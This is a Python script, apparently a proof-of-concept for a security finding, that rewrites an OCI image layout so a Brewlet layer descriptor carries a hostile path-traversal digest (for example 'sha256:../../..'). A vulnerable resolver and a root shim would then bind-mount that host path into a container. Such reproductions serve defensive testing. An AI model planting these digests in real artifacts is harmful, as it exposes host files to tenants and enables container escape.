#!/usr/bin/env python3
# Copyright (c) Microsoft Corporation.
# Licensed under the MIT License.

"""Publish a Brewlet artifact whose layer descriptor carries a hostile digest.

This models the attacker in the tenant-controlled-digest finding: the OCI layout
stays internally consistent (every manifest still hashes to the digest that
names it), but a payload descriptor inside the manifest points somewhere other
than a content-addressed blob. An unvalidated resolver turns such a digest into
a host path and the root shim bind-mounts it into the container.
"""

import argparse
import hashlib
import json
from pathlib import Path

MEDIA_TYPES = {
    "jar": "application/vnd.brewlet.jar.layer.v1+jar",
    "classpath": "application/vnd.brewlet.classpath.layer.v1+tar",
    "modulepath": "application/vnd.brewlet.modulepath.layer.v1+tar",
    "cds": "application/vnd.brewlet.cds.layer.v1+jsa",
}


def blob_path(root, digest):
    return root / "blobs" / "sha256" / digest.removeprefix("sha256:")


def write_blob(root, data):
    digest = "sha256:" + hashlib.sha256(data).hexdigest()
    path = blob_path(root, digest)
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data)
    return digest, len(data)


def rewrite_manifest(root, descriptor, layer, digest):
    """Rewrite the manifest descriptor names, returning its new descriptor."""
    manifest = json.loads(blob_path(root, descriptor["digest"]).read_bytes())

    if "manifests" in manifest and "layers" not in manifest:
        for entry in manifest["manifests"]:
            entry.update(rewrite_manifest(root, entry, layer, digest))
    else:
        media_type = MEDIA_TYPES[layer]
        matched = False
        for entry in manifest.get("layers", []):
            if entry.get("mediaType") == media_type:
                entry["digest"] = digest
                entry.pop("size", None)
                matched = True
        if not matched:
            raise SystemExit(f"no {layer} layer ({media_type}) in manifest")

    raw = json.dumps(manifest, separators=(",", ":")).encode()
    new_digest, size = write_blob(root, raw)
    return {"digest": new_digest, "size": size}


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("layout", help="OCI layout root")
    parser.add_argument("ref", help="tagged reference to rewrite")
    parser.add_argument("digest", help="hostile digest to plant, e.g. sha256:../../..")
    parser.add_argument("--layer", choices=sorted(MEDIA_TYPES), default="jar")
    args = parser.parse_args()

    root = Path(args.layout)
    index_path = root / "index.json"
    index = json.loads(index_path.read_bytes())

    for entry in index.get("manifests", []):
        if entry.get("annotations", {}).get("org.opencontainers.image.ref.name") != args.ref:
            continue
        entry.update(rewrite_manifest(root, entry, args.layer, args.digest))
        index_path.write_bytes(json.dumps(index, separators=(",", ":")).encode())
        print(f"planted {args.layer} digest {args.digest} in {args.ref}")
        return

    raise SystemExit(f"ref {args.ref} not found in {index_path}")


if __name__ == "__main__":
    main()
